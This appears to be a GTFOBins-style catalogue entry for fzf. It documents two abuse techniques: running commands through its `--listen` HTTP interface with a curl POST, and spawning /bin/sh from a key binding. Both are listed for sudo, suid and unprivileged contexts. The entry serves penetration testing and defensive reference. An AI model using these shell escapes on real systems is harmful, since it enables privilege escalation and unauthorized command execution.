---
type: gtfobin
name: fzf
platform: Unix
functions: [command, shell]
tags: [gtfobin, unix, lotl]
---

# fzf

## command

```bash
fzf --listen=12345
```
_Commands can be issued via POST requests, for example:

```
curl http://localhost:12345 -d 'execute(/path/to/command)'
```_
**Contexts:** sudo, suid, unprivileged

## shell

```bash
fzf --bind 'enter:execute(/bin/sh)'
```
_Press `Enter` to receive the shell._
**Contexts:** sudo, suid, unprivileged
